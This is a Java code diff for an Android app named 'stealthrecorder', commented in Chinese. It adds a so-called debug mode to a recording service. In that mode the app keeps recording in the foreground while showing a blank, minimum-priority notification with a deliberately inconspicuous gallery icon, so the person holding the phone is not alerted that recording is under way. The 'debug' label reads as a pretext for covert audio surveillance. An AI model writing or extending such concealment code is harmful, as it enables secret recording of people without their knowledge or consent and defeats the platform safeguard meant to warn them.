@@ -2,6 +2,7 @@ package com.example.stealthrecorder;
 
 import android.app.*;
 import android.content.*;
+import android.content.SharedPreferences;
 import android.media.MediaRecorder;
 import android.os.*;
 import android.util.Log;
@@ -51,6 +52,19 @@ public class RecordingService extends Service {
     private void startForegroundService() {
         LogUtil.d("开始启动前台服务...");
         
+        // 检查调试模式：是否隐藏通知
+        SharedPreferences prefs = getSharedPreferences("debug_settings", Context.MODE_PRIVATE);
+        boolean hideNotification = prefs.getBoolean("hide_notification_mode", false);
+        
+        if (hideNotification) {
+            LogUtil.d("调试模式：隐藏状态栏通知");
+            // 在调试模式下，不显示通知
+            // 但仍然需要启动前台服务以避免被系统杀死
+            startForeground(NOTIFICATION_ID, createEmptyNotification());
+            return;
+        }
+        
+        // 正常模式：显示通知
         // 确保通知渠道存在
         createNotificationChannel();
         
@@ -125,6 +139,34 @@ public class RecordingService extends Service {
                 LogUtil.e("❌ 重新启动前台服务也失败", e2);
             }
         }
+    }
+    
+    private Notification createEmptyNotification() {
+        // 创建一个完全空的、不可见的通知
+        Notification.Builder builder;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            builder = new Notification.Builder(this, "recording_channel");
+        } else {
+            builder = new Notification.Builder(this);
+        }
+        
+        // 创建一个几乎不可见的通知
+        builder.setContentTitle("")
+               .setContentText("")
+               .setSmallIcon(android.R.drawable.ic_menu_gallery)  // 使用一个不显眼的图标
+               .setOngoing(true)
+               .setShowWhen(false)
+               .setOnlyAlertOnce(true)
+               .setWhen(0);
+        
+        // 设置最低优先级
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            builder.setPriority(NotificationManager.IMPORTANCE_MIN);
+        } else {
+            builder.setPriority(Notification.PRIORITY_MIN);
+        }
+        
+        return builder.build();
     }
     
     private void createNotificationChannel() {
